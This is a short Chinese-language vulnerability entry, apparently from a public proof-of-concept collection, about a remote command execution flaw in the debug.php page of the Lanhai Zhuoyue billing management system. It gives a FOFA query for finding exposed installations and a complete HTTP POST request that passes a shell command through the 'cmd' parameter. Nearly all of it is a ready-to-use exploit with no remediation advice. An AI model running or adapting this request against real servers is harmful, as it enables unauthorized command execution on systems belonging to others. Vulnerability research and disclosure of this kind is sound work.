# 蓝海卓越 计费管理系统debug存在远程命令执行漏洞

# 一、漏洞简介
蓝海卓越 计费管理系debug存在远程命令执行漏洞，导致攻击者可以远程命令执行

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


# 四、漏洞复现
```plain
POST /debug.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 6
Connection: close
Cookie: PHPSESSID=6jvq6prlaoemtc00r7a876ntb4
Priority: u=1

cmd=id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uz5gelsecrff83dp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
